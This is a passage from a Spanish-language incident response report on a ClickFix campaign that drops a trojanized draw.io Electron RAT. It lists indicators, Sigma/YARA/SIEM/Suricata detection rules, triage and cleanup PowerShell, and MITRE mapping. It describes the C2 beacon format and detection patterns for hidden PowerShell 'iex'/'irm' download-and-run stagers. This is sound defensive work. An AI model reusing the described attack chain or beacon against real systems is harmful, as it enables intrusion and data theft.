El equipo envió un beacon de prueba al C2 con valores dummy `["analyst","ANALYST-LAB","analyst"]`. El servidor mantuvo la conexión abierta sin entregar respuesta. Se concluye lo siguiente: el endpoint está activo y aceptando TLS, y solo entrega contenido útil cuando el body coincide con el formato esperado o cuando el operador tiene una tarea encolada para el ID específico. La instrumentación del C2 es minimalista, diseñada para no entregar información útil a un curioso casual.

---

## Indicadores de compromiso

### Red

```
Sitio comprometido:    yourdomain[.]com           (192.124.249.28, Sucuri)
Staging dominio:       ccudmcx[.]xyz           (Cloudflare)
Staging URLs:          https://ccudmcx[.]xyz/u
                       https://ccudmcx[.]xyz/u/             (script.ps1)
                       https://ccudmcx[.]xyz/update.zip
C2 dominio:            chimefusion[.]com       (Cloudflare)
C2 endpoint:           POST https://chimefusion[.]com/u/
                       Body: ["<id>","<COMPUTERNAME>","<USERNAME>"]
```

### Hashes (SHA.256)

```
85b38a1adaf13650d06966572e402415ac3aa7ec9f53adb6e5eb48ae8b0f9974   script.ps1            (stage 2)
d942e9cfc0ca32a3d66ec690090ee22dca74953efed6889fb2292de36f5e39fd   update.zip            (stage 4)
0642708ec7c25dec3168f1ab275a29bfd3cf69fe3afc3d5c6eadfa6750102883   resources/app.asar    (modificado)
bfcd61c6b2dc98354f1a1a6e20a3d61c94530f2c39f3f4c708252da4db57ba9f   draw.io.exe           (genuino, firmado JGraph)
```

### Disco

```
%APPDATA%\setup.txt                         ID de víctima, 8 chars [0.9a.z]
%LOCALAPPDATA%\Microsoft\Cache\demo.log     log decoy del stage 2
%TEMP%\runner.ps1                           stage 3
%TEMP%\update26.zip                         eliminado tras la extracción
%LOCALAPPDATA%\UpdateApp\                   carpeta de instalación
%LOCALAPPDATA%\UpdateApp\draw.io.exe
%LOCALAPPDATA%\UpdateApp\resources\app.asar
%TEMP%\<unix_ms>\                           creado por cada tarea task.files
```

### Persistencia (Windows)

Buscar entradas que apunten a `%LOCALAPPDATA%\UpdateApp\draw.io.exe` en:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run\
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\   (atajos .lnk)
```

`setLoginItemSettings({openAtLogin:true, openAsHidden:false})` típicamente crea un valor en `HKCU\...\Run` con AppUserModelID `com.squirrel.drawio.draw.io` o nombre similar. La forma exacta varía por versión de Squirrel.

### Procesos

```
Padre: explorer.exe
Hijo:  powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %TEMP%\runner.ps1

Padre: powershell.exe
Hijo:  draw.io.exe (desde %LOCALAPPDATA%\UpdateApp\)

Path del proceso: *\AppData\Local\UpdateApp\draw.io.exe
                  (drawio legítimo se instala en Program Files, no en AppData)
```

### Comportamiento

```
. POST HTTPS a chimefusion[.]com cada 65 segundos
. Array JSON de exfiltración: [uuid, hostname, username]
. PowerShell con padre explorer.exe, cmdline contiene `iex` y `irm`
. Aplicación Electron invocando child_process.exec()
. Archivos base64 escritos en %TEMP%\<13_dígitos>\
. Autorun por setLoginItemSettings (crea valor en HKCU\...\Run)
. Bloque finally{} con dropper en script PS1
. Listener `copy` global en JS de la página de entrega
. UUID alfanumérico de 8 chars en setup.txt
```

---

## Reglas de detección

### Sigma

#### cf.001. Stager PowerShell desde el cuadro Ejecutar

```yaml
title: ClickFix PowerShell stager (irm/iex desde Run)
id: cf-001
status: experimental
description: |
    Stager PowerShell de campaña ClickFix lanzado desde el diálogo Ejecutar.
    Usa irm + iex. ParentImage es explorer.exe (típico de Win+R).
tags: [attack.execution, attack.t1059.001, attack.t1204.002]
logsource: { product: windows, category: process_creation }
detection:
  selection_parent: { ParentImage|endswith: '\explorer.exe' }
  selection_proc:   { Image|endswith: '\powershell.exe' }
  selection_cmd:    { CommandLine|contains|all: ['iex', 'irm'] }
  filter_admin:     { User|contains: 'SYSTEM' }
  condition: all of selection_* and not filter_admin
falsepositives:
  - Scripts de administración legítimos lanzados desde Win+R
level: high
```

#### cf.002. Instalación de archivos del RAT

```yaml
title: ClickFix UpdateApp folder, setup.txt y demo.log
id: cf-002
logsource: { product: windows, category: file_event }
detection:
  any_of:
    s1: { TargetFilename|contains: '\AppData\Local\UpdateApp\' }
    s2: { TargetFilename|contains: '\AppData\Local\Microsoft\Cache\demo.log' }
    s3: { TargetFilename|contains: '\AppData\Local\Temp\runner.ps1' }
    s4: { TargetFilename|contains: '\AppData\Local\Temp\update26.zip' }
    s5: { TargetFilename|endswith: '\AppData\Roaming\setup.txt' }
  condition: any_of
falsepositives:
  - drawio legítimo (drawio oficial se instala en Program Files, no en AppData)
level: critical
```

#### cf.003. DNS hacia infraestructura ClickFix

```yaml
title: drawio.exe balizando a infraestructura ClickFix
id: cf-003
logsource: { product: zeek, category: dns }
detection:
  selection:
    query:
      - 'chimefusion.com'
      - 'ccudmcx.xyz'
  condition: selection
level: critical
```

#### cf.004. Autorun en HKCU\Run apuntando a UpdateApp

```yaml
title: Autorun de Electron desde ruta no estándar (UpdateApp)
id: cf-004
logsource: { product: windows, category: registry_event }
detection:
  selection:
    EventType: SetValue
    TargetObject|contains: 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    Details|contains:
      - 'draw.io.exe'
      - 'UpdateApp'
  condition: selection
falsepositives:
  - drawio instalado manualmente en una ruta no estándar
level: high
```

### YARA

```yara
rule ClickFix_Electron_RAT_DrawIO
{
    meta:
        author      = "DFIR"
        description = "Trojanized drawio.desktop electron.js (RAT loader, chimefusion C2)"
        date        = "2026-05-04"
        sha256      = "0642708ec7c25dec3168f1ab275a29bfd3cf69fe3afc3d5c6eadfa6750102883"
    strings:
        $alpha     = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/="  // alfabeto base64 invertido
        $c2        = "chimefusion.com" ascii wide nocase
        $rejcert   = "rejectUnauthorized" ascii wide
        $login     = "setLoginItemSettings" ascii wide
        $beacon    = "65000" ascii
        $beacon2   = "65e3" ascii
        $rat_path  = "UpdateApp" ascii wide
        $rat_log   = "Microsoft\\Cache" ascii wide
        $rat_uuid  = "setup.txt" ascii wide
        $obf1      = "WQf3W6RcUta"      // primera entrada del array
        $obf2      = "rMFLjP"
        $obf3      = "ViApjp"
    condition:
        $c2 or
        (3 of ($rat_*)) or
        (any of ($alpha, $obf1, $obf2, $obf3) and $login) or
        (uint16(0) == 0x4b50 and $c2)               // ZIP que contiene el dominio
}

rule ClickFix_PS1_Stager_Finally
{
    meta:
        author      = "DFIR"
        description = "Stager PS1 con abuso de finally{} y descarga desde ccudmcx"
    strings:
        $finally  = "} finally {" ascii nocase
        $runner   = "runner.ps1" ascii
        $bypass   = "ExecutionPolicy Bypass" ascii
        $hidden   = "WindowStyle Hidden" ascii
        $download = "ccudmcx" ascii nocase
        $demo_log = "demo.log" ascii
    condition:
        $finally and $runner and $bypass and $hidden and ($download or $demo_log)
}
```

### Splunk SPL

```spl
# Stager PowerShell con Script Block Logging (Event 4104)
index=windows EventCode=4104
| search ScriptBlockText="*iex*" ScriptBlockText="*irm*"
| eval riesgo=if(like(ScriptBlockText,"%ccudmcx%") OR like(ScriptBlockText,"%chimefusion%"),
              "CRITICO","ALTO")
| table _time, ComputerName, UserID, ScriptBlockText, riesgo
| sort -_time

# DNS hacia los dominios de la campaña
index=dns query IN ("chimefusion.com","ccudmcx.xyz")
| stats count by src_ip, query, _time
| sort -_time

# PowerShell oculto con capacidad de descarga
index=windows EventCode=4688
| search NewProcessName="*powershell*"
    ProcessCommandLine="*WindowStyle*Hidden*"
    ProcessCommandLine="*ExecutionPolicy*Bypass*"
| table _time, ComputerName, SubjectUserName, ProcessCommandLine

# Creación de archivos del RAT (Sysmon EID 11)
index=windows EventCode=11
| search TargetFilename="*\\UpdateApp\\draw.io*"
    OR TargetFilename="*runner.ps1*"
    OR TargetFilename="*\\Microsoft\\Cache\\demo.log*"
| table _time, ComputerName, TargetFilename

# Modificación de autorun HKCU
index=windows EventCode=13
| search TargetObject="*CurrentVersion\\Run*" Details="*draw.io*"
| table _time, ComputerName, SubjectUserName, TargetObject, Details

# Patrón periódico ~65s desde el endpoint hacia el C2
index=network dest_host="chimefusion.com" http_method="POST"
| timechart span=1m count by src_ip
| where count > 1
```

### Microsoft Sentinel (KQL)

```kql
// DNS de la campaña
DnsEvents
| where Name in ("chimefusion.com", "ccudmcx.xyz")
| project TimeGenerated, Computer, ClientIP, Name, QueryType
| order by TimeGenerated desc

// PowerShell oculto con capacidad de descarga
SecurityEvent
| where EventID == 4688
| where CommandLine has_all ("powershell", "Hidden", "Bypass")
| where CommandLine has_any ("irm", "Invoke-RestMethod", "WebRequest")
| project TimeGenerated, Computer, Account, CommandLine

// Instalación del RAT
DeviceFileEvents
| where FolderPath contains "UpdateApp"
    or FolderPath contains @"Microsoft\Cache\demo.log"
| project TimeGenerated, DeviceName, InitiatingProcessAccountName,
          ActionType, FileName, FolderPath

// Persistencia
DeviceRegistryEvents
| where RegistryKey contains @"CurrentVersion\Run"
| where RegistryValueData contains "draw.io"
| project TimeGenerated, DeviceName, InitiatingProcessAccountName,
          RegistryKey, RegistryValueName, RegistryValueData

// Beacon HTTPS POST periódico
DeviceNetworkEvents
| where RemoteUrl contains "chimefusion.com"
    or InitiatingProcessFolderPath contains "UpdateApp"
| summarize count(), min(Timestamp), max(Timestamp),
            avg(SentBytes) by DeviceName, RemoteUrl, InitiatingProcessFileName
| where count_ > 5
```

### Elastic EQL

```eql
process where event.type == "start"
  and process.parent.name == "explorer.exe"
  and process.name == "powershell.exe"
  and process.command_line like~ "*iex*irm*"

process where event.type == "start"
  and process.executable like~ "*\\AppData\\Local\\UpdateApp\\draw.io.exe"

registry where event.type in ("creation", "change")
  and registry.path like~ "*\\CurrentVersion\\Run*"
  and registry.data.strings like~ "*UpdateApp*"
```

### Suricata

```
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"ClickFix Beacon C2 chimefusion.com";
    flow:established,to_server;
    http.method; content:"POST";
    http.uri; content:"/u/";
    http.host; content:"chimefusion.com";
    classtype:trojan-activity;
    sid:9000001; rev:1;
)

alert dns any any -> any any (
    msg:"ClickFix campaign domain";
    dns.query; content:"chimefusion.com"; nocase;
    classtype:trojan-activity;
    sid:9000002; rev:1;
)

alert dns any any -> any any (
    msg:"ClickFix staging domain";
    dns.query; content:"ccudmcx.xyz"; nocase;
    classtype:trojan-activity;
    sid:9000003; rev:1;
)
```

---

## Mapeo a MITRE ATT&CK

| Táctica | Técnica | Implementación |
|---|---|---|
| Resource Development | T1583.001 Acquire Infrastructure: Domains | `ccudmcx[.]xyz`, `chimefusion[.]com` |
| Resource Development | T1583.003 VPS / CDN | Cloudflare delante de ambos dominios |
| Initial Access | T1189 Drive.by Compromise | sitio legítimo sirviendo HTML malicioso |
| Execution | T1059.001 PowerShell | `iex(irm ...)`, `runner.ps1` |
| Execution | T1059.007 JavaScript | `electron.js` Node, tareas `eval` |
| Execution | T1204.004 User Execution: Malicious Copy and Paste | la víctima pega el comando en `Win+R` |
| Persistence | T1547.001 Run Keys / Startup Folder | `app.setLoginItemSettings({openAtLogin:true})` |
| Defense Evasion | T1027.013 Encrypted/Encoded Files | obfuscator.io con base64 custom + RC4 |
| Defense Evasion | T1036.005 Masquerading | `draw.io.exe`, `Microsoft\Cache\demo.log`, `setup.txt` |
| Defense Evasion | T1553.002 Subvert Trust Controls: Code Signing | reutilización de la firma JGraph, asar no validado |
| Defense Evasion | T1564.003 Hidden Window | `Start-Process -WindowStyle Hidden` |
| Defense Evasion | T1140 Deobfuscate/Decode in memory | `iex(irm)` |
| Defense Evasion | T1070.004 File Deletion | `Remove-Item $zipPath` post extract |
| Command & Control | T1071.001 Web Protocols (HTTPS) | POST JSON sobre TLS |
| Command & Control | T1090.004 Domain Fronting / CDN | Cloudflare como front |
| Command & Control | T1573.002 Encrypted Channel | TLS estándar, sin pinning, `rejectUnauthorized:false` |
| Collection | T1115 Clipboard Data | listener `copy` global en la página falsa |
| Ingress Tool Transfer | T1105 | `Invoke-WebRequest` (stage 4), `task.files` |
| Discovery | T1082 System Information Discovery | exfiltración de `COMPUTERNAME` y `USERNAME` |
| Exfiltration | T1041 Exfiltration Over C2 Channel | hostname y usuario en cada beacon |
| Impact | T1059 (genérico) | RCE arbitrario por `eval()` y `child_process.exec` |

---

## Triage en endpoints sospechosos

Script de verificación rápida (objetivo: confirmación o descarte en menos de 30 segundos):

```powershell
# 1. Marcadores en disco.
$verificaciones = @{
    "Binario RAT"      = Test-Path "$env:LOCALAPPDATA\UpdateApp\draw.io.exe"
    "UUID Dispositivo" = Test-Path "$env:APPDATA\setup.txt"
    "Log decoy"        = Test-Path "$env:LOCALAPPDATA\Microsoft\Cache\demo.log"
    "runner.ps1"       = Test-Path "$env:TEMP\runner.ps1"
    "update26.zip"     = Test-Path "$env:TEMP\update26.zip"
    "Autorun HKCU"     = ((Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -EA SilentlyContinue).PSObject.Properties.Value -match "draw\.io") -ne $null
    "Proceso vivo"     = (Get-Process | Where-Object { $_.Path -like "*UpdateApp*" }).Count -gt 0
}

$infectado = $false
foreach ($c in $verificaciones.GetEnumerator()) {
    $estado = if ($c.Value) { "[INFECTADO]"; $infectado = $true } else { "[LIMPIO]   " }
    Write-Host "$estado $($c.Key)"
}

if ($infectado) {
    $uuid = Get-Content "$env:APPDATA\setup.txt" -EA SilentlyContinue
    Write-Host "`nINFECTADO. Aislar inmediatamente." -ForegroundColor Red
    Write-Host "UUID enviado al C2: $uuid" -ForegroundColor Red
    $ts = (Get-Item "$env:APPDATA\setup.txt" -EA SilentlyContinue).CreationTime
    if ($ts) {
        $segundos = ((Get-Date) - $ts).TotalSeconds
        $beacons  = [math]::Floor($segundos / 65)
        Write-Host "Fecha aproximada de infección: $ts"
        Write-Host "Beacons estimados enviados: $beacons (1 cada 65s)"
    }
}

# 2. Conexiones activas hacia el C2.
$dominiosC2 = @("chimefusion.com","ccudmcx.xyz")
Get-NetTCPConnection -State Established -EA SilentlyContinue | ForEach-Object {
    try {
        $rh = [Net.Dns]::GetHostEntry($_.RemoteAddress).HostName
        if ($dominiosC2 | Where-Object { $rh -match $_ }) {
            Write-Host "[C2 ACTIVO] $rh ($($_.RemoteAddress))" -ForegroundColor Red
        }
    } catch {}
}

# 3. Autorun granular.
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\*" -ErrorAction SilentlyContinue |
  Where-Object { $_ -match 'UpdateApp|draw\.io' }
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" |
  Where-Object { $_.Name -match 'draw|update' }

# 4. Procesos.
Get-CimInstance Win32_Process |
  Where-Object { $_.ExecutablePath -like '*\UpdateApp\*' } |
  Select-Object ProcessId, ExecutablePath, ParentProcessId, CommandLine
```

---

## Contención y remediación

Una vez confirmada la infección, el orden operacional importa: primero recolección forense, luego terminación y limpieza.

### Recolección antes de la limpieza

```powershell
# Volcado de memoria del proceso (procdump, WinPmem, o EDR)
$proc = Get-Process | Where-Object { $_.Path -like "*UpdateApp*" }
# procdump -ma $proc.Id C:\Evidencia\drawio_dump.dmp

# Artefactos
New-Item -ItemType Directory C:\Evidencia -Force | Out-Null
Copy-Item "$env:LOCALAPPDATA\UpdateApp\"             "C:\Evidencia\" -Recurse
Copy-Item "$env:APPDATA\setup.txt"                   "C:\Evidencia\" -EA SilentlyContinue
Copy-Item "$env:LOCALAPPDATA\Microsoft\Cache\demo.log" "C:\Evidencia\" -EA SilentlyContinue
Copy-Item "$env:TEMP\runner.ps1"                     "C:\Evidencia\" -EA SilentlyContinue

# Registro
reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" C:\Evidencia\autorun.reg

# Conexiones de red al momento de la captura
Get-NetTCPConnection | Export-Csv C:\Evidencia\conexiones_red.csv -NoTypeInformation

# Historial de PowerShell
Copy-Item (Get-PSReadlineOption).HistorySavePath "C:\Evidencia\" -EA SilentlyContinue
```

### Limpieza

```powershell
# Terminar el proceso del RAT
Get-Process | Where-Object { $_.Path -like "*UpdateApp*" } |
    Stop-Process -Force -EA SilentlyContinue

# Eliminar autorun
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "draw.io" -Force -EA SilentlyContinue

# Eliminar instalación
Remove-Item "$env:LOCALAPPDATA\UpdateApp" -Recurse -Force -EA SilentlyContinue

# Eliminar artefactos
@(
    "$env:APPDATA\setup.txt",
    "$env:TEMP\runner.ps1",
    "$env:TEMP\update26.zip",
    "$env:LOCALAPPDATA\Microsoft\Cache\demo.log"
) | ForEach-Object { Remove-Item $_ -Force -EA SilentlyContinue }

# Eliminar drop dirs de tareas C2 (timestamps de 13 dígitos)
Get-ChildItem $env:TEMP -Directory |
    Where-Object { $_.Name -match '^\d{13}$' } |
    Remove-Item -Recurse -Force -EA SilentlyContinue

Write-Host "Contención completada. Reverificar con el script de triage."
```

### Bloqueo en perímetro

```
DNS sinkhole:
  chimefusion.com → 0.0.0.0
  ccudmcx.xyz     → 0.0.0.0

Proxy / firewall:
  Bloquear https://chimefusion.com/*
  Bloquear https://ccudmcx.xyz/*
  Bloquear POST egress desde endpoints hacia esos hosts
```

### Recomendación de reimagen

La capacidad `eval()` recibida desde el C2 implica que el alcance real de la actividad ejecutada durante el dwell time es desconocido. Si el RAT estuvo activo durante un periodo extendido:

- Asumir despliegue de payloads secundarios (stealers, RDP installers, ransomware no detonado).
- Asumir robo de credenciales del navegador, password managers locales y tokens OAuth.
- Recomendar reimagen completa del sistema operativo para infecciones confirmadas.
- Si la reimagen no es viable, aplicar monitoreo extendido por al menos 60 días, reducción de privilegios y segmentación de red.

---

## Recomendaciones operacionales

### Operador del sitio comprometido

1. Retirar la página del aire o establecer modo de mantenimiento mientras se conduce la limpieza. Asumir que el atacante mantiene acceso al CMS o al hosting con privilegios efectivos. La presencia del overlay no es resultado de un acceso de cinco minutos.
2. Auditoría completa del CMS. La instalación más probable es WordPress detrás de Sucuri. Diff sobre `wp-content/themes/*`, `wp-content/mu-plugins`, plugins, `index.php` raíz, `.htaccess`. Inspeccionar archivos con timestamps recientes y nombres atípicos, payloads PHP camuflados, `eval` en plugins, hooks colgados.
3. Purgar la cache del WAF. La página falsa se sirve con `x-sucuri-cache: HIT`, lo que indica que el contenido malicioso está cacheado. Mientras la cache no se invalide, los visitantes seguirán recibiendo el overlay aun después de limpiar el origen.
4. Rotación completa de credenciales. Hosting, FTP, SSH, base de datos, panel del CMS, llaves API, paneles de Sucuri y Cloudflare. Llaves SSH de personal con acceso. Credenciales de la cuenta del registrador del dominio. Imponer MFA obligatorio en todos los administradores.
5. Revisar logs de acceso por al menos 90 días. Subidas de archivos, autenticaciones desde IPs anómalas, intentos POST a `wp-admin` desde geos atípicas. El vector inicial pudo ser un plugin vulnerable o credenciales filtradas y debe cerrarse antes de volver a publicar.
6. Comunicación pública. Notificar a usuarios y prensa del sector. Mensaje principal: el sitio fue clonado por una página de "verificación humana" que solicita presionar `Win+R`, `Ctrl+V`, Enter. Bajo ningún supuesto seguir esos pasos desde una web. Visitantes que lo hayan hecho deben contactar a TI.
7. Reportes de abuso, en paralelo, a Cloudflare (`https://abuse.cloudflare.com/`), al registrador de `.xyz` (CentralNic / Gen.xyz), Google Safe Browsing, Microsoft SmartScreen, PhishTank, urlscan.io, y al CSIRT correspondiente.

### Víctima individual

1. Aislamiento inmediato del equipo. Desconexión de red cableada e inalámbrica.
2. Confirmación con el script de triage de la sección anterior.
3. Asumir compromiso a nivel usuario. Durante el dwell time, el operador pudo empujar payloads arbitrarios a través de `task.e`. Robo de tokens y cookies de sesión, password manager local, criptomonedas, sesiones de Microsoft 365 o Gmail, y cualquier credencial cacheada por el navegador deben considerarse comprometidos. Posible despliegue de un infostealer secundario o RDP installer.
4. Rotación completa de contraseñas y revocación de sesiones desde un dispositivo limpio. Revocar OAuth grants, regenerar TOTP, rotar app passwords. Si se utiliza un password manager local, asumir que la base está comprometida.
5. Reinstalación limpia de Windows o restauración de imagen previa al incidente. La limpieza parcial no es suficiente: el operador pudo establecer persistencia adicional fuera del rastro estándar.

### SOC / EDR

- Bloqueo DNS y de egress hacia `chimefusion[.]com` y `ccudmcx[.]xyz`.
- WDAC o AppLocker prohibiendo ejecución de binarios desde `%LOCALAPPDATA%\` salvo allowlist explícita. Esta política mitiga la cadena descrita y un porcentaje significativo de campañas tipo Lumma del último año.
- Reglas ASR de Microsoft Defender. En particular: "Block execution of potentially obfuscated scripts" (`D1E49AAC-8F56-4280-B9BA-993A6D77406C`) y "Block executable files from running unless they meet a prevalence, age, or trusted list criterion".
- PowerShell en Constrained Language Mode, AMSI activo, eventos 4103 y 4104 reenviados al SIEM con alertas para `iex` o `Invoke-Expression` combinados con `irm` o `Invoke-RestMethod`.
- En endpoints sensibles (perfiles administrativos no técnicos), GPO con `NoRun=1` en `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`. Deshabilita el cuadro `Win+R`. En la mayoría de roles no genera disrupción operativa.
- Detección de cmdline con `iex` y `irm` apuntando a TLDs `.xyz`, `.top`, `.shop`, `.online` con dominios de registro reciente. Es un indicador de alta señal y baja fricción.

---

## Threat hunting y atribución

### Fingerprint de la campaña

Características que identifican esta campaña específica para comparación contra muestras futuras:

| Elemento | Valor | Confianza |
|---|---|---|
| Intervalo de beacon | exactamente 65 000 ms | alta. Valor atípico |
| Offset base del array de strings | 229 | alta |
| Tamaño del array | 1 015 entradas | media |
| Ofuscación | RC4 + base64 con minúsculas en posición inicial | alta |
| Archivo de ID de víctima | `%APPDATA%\setup.txt`, base36 de 8 chars | alta |
| Nombre del log decoy | `demo.log` en `Microsoft\Cache` | alta |
| Patrón finally{} | try{} benigno + finally{} con dropper | alta |
| Binario señuelo | drawio.desktop v19.0.3 | media |
| Path C2 | `/u/` | baja |
| JSON beacon | `[uuid, hostname, username]` | alta |

### Pivoting

```bash
# CT logs
curl "https://crt.sh/?q=chimefusion.com&output=json" | python3 -m json.tool
curl "https://crt.sh/?q=ccudmcx.xyz&output=json"     | python3 -m json.tool

# WHOIS
whois chimefusion.com
whois ccudmcx.xyz

# Reverse IP
curl "https://viewdns.info/reverseip/?host=chimefusion.com&output=json"

# ThreatFox
curl -X POST https://threatfox-api.abuse.ch/api/v1/ \
     -d '{"query":"search_ioc","search_term":"chimefusion.com"}'

# URLhaus
curl -X POST https://urlhaus-api.abuse.ch/v1/host/ \
     -d "host=chimefusion.com"

# VirusTotal: archivos comunicándose con el C2
curl "https://www.virustotal.com/api/v3/domains/chimefusion.com/communicating_files" \
     -H "x-apikey: $VT_KEY"

# GitHub: búsqueda de referencias públicas a los IOCs
# search query: chimefusion.com ccudmcx.xyz

# Censys / Shodan: favicon hash y JARM del C2
```

La huella de servidor `GET /u/ → 400 application/json + CORS abierto` es suficientemente específica para producir un cluster identificable en Censys o Shodan.

### Comparación con ClickFix de referencia

| Característica | Esta campaña | ClickFix de referencia |
|---|---|---|
| Widget Cloudflare falso | sí | muy común |
| Inyección de portapapeles + Win+R | sí | característica definitoria |
| PowerShell `irm`+`iex` | sí | común |
| Señuelo Electron | sí | en aumento durante 2024.2025 |
| Mascarada drawio | sí | observada en múltiples campañas |
| Ofuscación RC4 + base64 | sí | común en JS malicioso |
| Abuso de `finally{}` | sí | menos común. Posible firma del actor |
| Cliente HTTP custom (sin fetch) | sí | menos común |
| Beacon a 65 segundos | sí | distintivo. Posible firma del actor |
| Reutilización de firma Authenticode legítima | sí | poco común. Pieza dura del ataque |

---

## Toolkit automatizado de desobfuscación

Czr.Xploit publicó el toolkit completo en `https://github.com/Czr-Xploit/ClickFix_Extractor`. Tres componentes:

`clickfix_deobfuscate.py`. Extrae el array de strings desde `electron.js`, identifica los mappings de claves mediante regex sobre patrones `bx(idx, key)`, y decodifica los literales con base64 modificado más RC4. Categoriza la salida en C2/red, filesystem, ejecución, persistencia y módulos.

```bash
python3 clickfix_deobfuscate.py electron.js
python3 clickfix_deobfuscate.py electron.js --verbose
python3 clickfix_deobfuscate.py electron.js --output mi_analisis.json
```

`clickfix_ioc_extractor.py`. Lee `deobfuscated_strings.json`, extrae dominios, URLs y paths mediante regex, hashea muestras en bulk y genera un STIX 2.1 bundle.

```bash
python3 clickfix_ioc_extractor.py \
    --strings deobfuscated_strings.json \
    --samples ./muestras/ \
    --stix \
    --output iocs/iocs_completos.json
```

`clickfix_infection_check.ps1`. Triage en Windows mediante 8 verificaciones: binario en `UpdateApp`, presencia de `setup.txt`, `demo.log`, autorun, conexiones activas a dominios C2, procesos desde `UpdateApp`, drop dirs de 13 dígitos en `TEMP`, y artefactos del PS1.

```powershell
powershell -ExecutionPolicy Bypass -File clickfix_infection_check.ps1
```

Workflow completo de análisis, asumiendo posesión del ZIP:

```bash
unzip update.zip -d extraido/
npm install -g @electron/asar
asar extract extraido/resources/app.asar ./app_code/
python3 tools/clickfix_deobfuscate.py app_code/electron.js
python3 tools/clickfix_ioc_extractor.py \
    --strings deobfuscated_strings.json \
    --samples ./extraido/ \
    --stix
```

---

## Trabajo pendiente y pivoting adicional

- Revisión cruzada en VirusTotal, urlscan.io, Censys/Shodan favicon hash y CT logs sobre `chimefusion[.]com`. La huella `GET /u/ → 400 application/json + CORS abierto` es suficientemente específica para producir clustering útil.
- Reproducción controlada del beacon desde un entorno aislado. Envío de un body válido con un ID generado para capturar la respuesta del operador y obtener la segunda etapa real.
- Búsqueda de campañas con plantilla equivalente. La combinación "Cloudflare verify falso + clipboard hijack + iex(irm) hacia .xyz + Electron app trojanizada con drawio" es relativamente novedosa. En MalwareBazaar y VirusTotal vale la pena rastrear archivos firmados por JGraph Ltd que contengan asar de tamaño elevado y hash distinto al oficial de v19.0.3.
- Notificación a JGraph Ltd. La firma del publisher no fue clonada, pero el binario está siendo abusado. Sería pertinente que publiquen los hashes oficiales de v19.0.3 para validación por EDR, o que migren el desktop a una versión de Electron con `enableEmbeddedAsarIntegrityValidation` habilitado.

---

## Concienciación para el usuario final

Pauta operativa general:

> Ningún sistema de verificación legítimo (Cloudflare, Google reCAPTCHA, Microsoft, ningún proveedor) solicita al usuario:
>
> 1. Abrir el cuadro `Win+R`.
> 2. Pegar un comando.
> 3. Ejecutar comandos en PowerShell o CMD.
>
> Cualquier página que solicite alguno de estos pasos debe cerrarse y reportarse al equipo de seguridad correspondiente.

Notas adicionales:

- drawio se descarga únicamente desde `github.com/jgraph/drawio-desktop/releases`.
- Usuarios que hayan ejecutado las instrucciones en una página sospechosa deben contactar a TI inmediatamente y abstenerse de auto.remediar.
- Un "Verification ID" en un CAPTCHA no corresponde a una funcionalidad real. Los CAPTCHAs no generan tokens numéricos visibles al usuario.
- La verificación real de Cloudflare Turnstile se ejecuta automáticamente en el navegador. No requiere acción del usuario más allá de un clic en un checkbox.

---

## Apéndice A. Artefactos en disco

Todos en `/home/none/Documents/soc/<caso>/`:

```
INFORME_INCIDENTE.md            este informe
deobfuscate.py                  decoder Python (base64 custom + RC4)
arr.json                        string array extraído (1 015 entradas)
deobfuscated_strings.json       tabla completa decodificada

index.html                      raíz servida por el sitio comprometido (decomprimida)
headers.txt                     cabeceras HTTP del sitio comprometido

stage2_payload.txt              script.ps1 stage 2
stage2_payload_headers.txt
stage2_ccudmcx.txt              respuesta inicial 301
stage2_headers.txt
c2_beacon_response.txt          respuesta del C2 al beacon de prueba

update.zip                      stage 4 (134 MB)
extracted/                      contenido del ZIP (sin locales/*.pak ni LICENSES)
  draw.io.exe
  resources/app.asar
  resources/app-update.yml
  ffmpeg.dll, d3dcompiler_47.dll, libEGL.dll, libGLESv2.dll,
  vulkan-1.dll, vk_swiftshader.dll, vk_swiftshader_icd.json,
  v8_context_snapshot.bin, snapshot_blob.bin, LICENSE.electron.txt
  drawio_authenticode.p7        firma Authenticode extraída del PE

asar_electron.js                electron.js extraído del asar (ofuscado)
asar_electron-preload.js
asar_index.html
asar_package.json
asar_disableUpdate.js

electron_decoded.js             electron.js con strings decodificadas (sin formatear)
electron_pretty.js              electron.js decodificado y embellecido (1 917 líneas)
```

## Apéndice B. Referencias

- Microsoft Security Blog, *Think before you Click(Fix)*, 2025.08.
- Sophos, *Evil evolution: ClickFix and macOS infostealers*.
- SentinelOne, *Caught in the CAPTCHA: How ClickFix is Weaponizing Verification Fatigue*.
- Splunk, *Beyond The Click: Unveiling Fake CAPTCHA Campaigns*.
- Palo Alto Unit 42, *Fix the Click: Preventing the ClickFix Attack Vector*.
- HHS Sector Alert, *ClickFix Attacks*.
- Fortinet, *From ClickFix to Command: A Full PowerShell Attack Chain*.
- Trend Micro, *KongTuke ClickFix Abuse of Compromised WordPress Sites*.
- Electron Security, *Asar Integrity*, `https://www.electronjs.org/docs/latest/tutorial/asar-integrity`.
- obfuscator.io, patrón decoder string.array + RC4.
- Czr.Xploit, *ClickFix_Extractor*, `https://github.com/Czr-Xploit/ClickFix_Extractor`.
